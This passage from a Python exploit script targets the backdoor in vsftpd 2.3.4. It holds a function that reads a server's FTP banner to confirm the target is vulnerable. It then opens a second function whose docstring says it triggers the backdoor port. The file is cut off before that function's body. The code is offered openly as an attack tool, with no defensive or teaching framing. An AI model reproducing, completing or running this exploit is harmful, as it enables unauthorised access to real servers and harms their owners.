import argparse
import re
import socket
import sys


def check_service_version(conn: socket.socket) -> bool:
    """
    Check the FTP service to make sure it is vulnerable to this exploit.
    :param conn: socket object connected to backdoor
    :return: boolean indicating vulnerable or not vulnerable
    """
    print('Checking service version.')
    banner_data = conn.recv(1024)
    banner = banner_data.decode().strip()
    print('Banner: {}'.format(banner))
    # check to make sure this is indeed running vsftpd v2.3.4
    if banner.lower() != '220 (vsftpd 2.3.4)':
        return False
    return True


def open_backdoor(conn: socket.socket) -> bool:
    """
    Send the parameters to the FTP server that will open the backdoor port.
    :param conn: socket object connected to backdoor
    :return: boolean indicating success or failure
    """